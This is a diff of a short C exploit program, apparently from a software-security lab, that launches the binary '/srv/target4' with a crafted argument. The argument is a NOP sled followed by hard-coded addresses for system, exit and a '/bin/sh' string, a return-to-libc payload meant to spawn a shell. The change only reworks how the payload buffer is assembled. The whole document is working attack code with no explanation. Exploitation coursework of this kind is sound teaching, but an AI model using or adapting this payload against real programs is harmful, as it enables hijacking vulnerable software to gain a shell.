@@ -7,25 +7,37 @@
 
 const char* TARGET = "/srv/target4";
 
-const char SLED[] = "\x90\x90\x90\x90\x90\x90\x90\x90";
-const char SYS[] = "\x60\x43\xe1\xf7";
-const char EX[] = "\xc0\x6e\xe0\xf7";
-const char SH[] = "\x63\xf3\xf5\xf7";
+const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90";
+const char* SYS = "\x60\x43\xe1\xf7";
+const char* EX = "\xc0\x6e\xe0\xf7";
+const char* SH = "\x63\xf3\xf5\xf7";
 
 int main(void)
 {
-    char args[2][300]; // Adjust size as needed to match your payload requirement
+    char *args[3];
     char *env[1];
-    strcpy(args[0], TARGET);
+    args[0] = (char*)TARGET;
 
-    // Create a single buffer that includes the sled and the addresses
-    snprintf(args[1], sizeof(args[1]), "%s%s%s%s", SLED, SYS, EX, SH);
+    // Allocate memory to hold the combined string
+    args[1] = malloc(strlen(SLED) + strlen(SYS) + strlen(EX) + strlen(SH) + 1);
+    if (args[1] == NULL) {
+        fprintf(stderr, "Memory allocation failed.\n");
+        return -1;
+    }
+    // Concatenate the strings safely into args[1]
+    strcpy(args[1], SLED);
+    strcat(args[1], SYS);
+    strcat(args[1], EX);
+    strcat(args[1], SH);
 
-    char *exec_args[] = {args[0], args[1], NULL};
+    args[2] = NULL;
     env[0] = NULL;
 
-    execve(TARGET, exec_args, env);
+    execve(TARGET, args, env);
     fprintf(stderr, "execve failed.\n");
+
+    // Free the allocated memory
+    free(args[1]);
 
     return 0;
 }
